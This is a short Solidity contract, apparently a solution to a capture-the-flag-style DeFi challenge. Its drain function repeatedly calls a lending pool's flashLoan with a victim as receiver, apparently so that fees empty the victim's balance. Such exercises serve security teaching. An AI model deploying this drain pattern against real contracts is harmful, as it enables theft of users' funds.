// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './NaiveReceiverLenderPool.sol';

/**
 * @title NaiveReceiverDrainer
 * @author Patate
 */
contract NaiveReceiverDrainer {
    NaiveReceiverLenderPool public immutable naiveReceiverLenderPool;

    constructor(NaiveReceiverLenderPool _naiveReceiverLenderPool) {
        naiveReceiverLenderPool = _naiveReceiverLenderPool;
    }

    function drain(address _victim, uint256 _steps) public {
        for (uint256 i = 0; i < _steps; i++) {
            naiveReceiverLenderPool.flashLoan(_victim, 0);
        }
    }
}
